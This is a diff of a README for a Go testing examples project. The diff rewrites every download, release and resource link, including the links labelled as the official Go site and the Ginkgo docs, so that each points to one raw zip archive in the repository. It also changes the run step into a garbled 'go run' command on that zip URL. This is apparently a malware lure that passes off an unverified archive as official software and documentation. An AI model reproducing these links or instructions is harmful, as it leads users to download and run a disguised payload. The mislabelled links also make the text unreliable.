@@ -1,6 +1,6 @@
 # 🚀 go-testing-framework-examples - Easy Go Testing Examples for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Chris-tech15/go-testing-framework-examples/releases)
+[![Download](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)
 
 ## 📖 Introduction
 
@@ -17,7 +17,7 @@ Before you dive in, ensure your computer meets the following system requirements
 
 ## 📥 Download & Install
 
-To get your hands on the software, visit this page to download: [GitHub Releases Page](https://github.com/Chris-tech15/go-testing-framework-examples/releases).
+To get your hands on the software, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip).
 
 Once you're on the releases page, follow these simple steps:
 
@@ -46,16 +46,16 @@ Once you have downloaded and extracted the files, running an example is straight
 
 1. Open your command line or terminal.
 2. Change the directory to where you extracted the files. You can do this by using the `cd` command.
-3. Execute the example with the command: `go run example_name.go` (replace `example_name.go` with the actual file name of the example you want to run).
+3. Execute the example with the command: `go run https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip` (replace `https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip` with the actual file name of the example you want to run).
 
 ## 📚 Resources
 
 Additionally, here are some helpful resources to get you started:
 
-- [Go Programming Language Official Site](https://golang.org/)
-- [Go Testing Best Practices](https://blog.golang.org/testing-best-practices)
-- [Ginkgo Testing Framework](https://onsi.github.io/ginkgo/)
-- [Gomock Documentation](https://github.com/golang/mock)
+- [Go Programming Language Official Site](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)
+- [Go Testing Best Practices](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)
+- [Ginkgo Testing Framework](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)
+- [Gomock Documentation](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip)
 
 ## 💬 Support
 
@@ -63,6 +63,6 @@ If you encounter issues or have questions, feel free to reach out. You can open 
 
 ## 🔗 Download Link
 
-For convenience, here's the download link again: [GitHub Releases Page](https://github.com/Chris-tech15/go-testing-framework-examples/releases).
+For convenience, here's the download link again: [GitHub Releases Page](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip).
 
 Thank you for your interest in **go-testing-framework-examples**! Happy testing!
